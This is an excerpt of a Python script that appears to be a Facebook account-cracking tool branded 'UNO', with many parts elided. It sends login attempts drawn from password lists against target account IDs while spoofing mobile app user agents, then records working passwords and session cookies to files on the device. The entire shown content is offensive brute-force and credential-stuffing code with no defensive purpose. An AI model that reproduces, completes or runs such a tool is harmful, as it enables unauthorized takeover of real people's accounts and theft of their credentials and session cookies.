...
syed =['FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBRV/304282940;FBCR/TM;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.%s;FBDV/SAMSUNG-SM-J727AZ;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]']
logo=("""\033[1;38m          
888     888 888b    888  .d88888b.  
...
def mmm(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m[UNO-CRACKING] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(cps)));sys.stdout.flush()
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in SHAHBAZ:
				...
				if 'y' in pcp:
					print('\r\r\x1b[1;92m[UNO-X-UNO-OK] '+ids+' | '+pas+'\033[1;97m')
					
					open('/sdcard/UNO-ALIVE.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
...
def ffb(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m[UNO-CRKNG] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
    ...
    'viewport-width': '980',
			...
			if "c_user" in SHAHBAZ:
				...
				print('\r\r\033[1;32m[UNO-ALIVE] %s | %s '%(ids,pas))
				print('\r\r\033[1;34mCOOKIE[©] : %s '%(kuki))
				print('\r\r\033[1;32mFB LINK : https://facebook.com/ %s '%(ids))
				
				open('/sdcard/UNO-ALIVE.txt', 'a').write(ids+'|'+pas+'|'+kuki+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in SHAHBAZ:
				if 'y' in pcp:
					...
					open('/sdcard/UNO-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
...
def fcrack(uid,pwx,tl):
	...
	try:
		for ps in pwx:
			session = requests.Session()
			sys.stdout.write(f'\r [\033[1;97mUNO / \033[1;97m] %s|OK:-%s \r'%(loop,len(cps))),
			sys.stdout.flush()
			ua = random.choice(ugen)
    ...
    'viewport-width': '980',
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\33[38;5;208m[UNO-CP] '+cid+' | '+ps+'\033[1;32m')
				...
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				print('\x1b[1;92m[UNO-X-UNO-OK] '+cid+' | '+ps+'\33[0;97m')
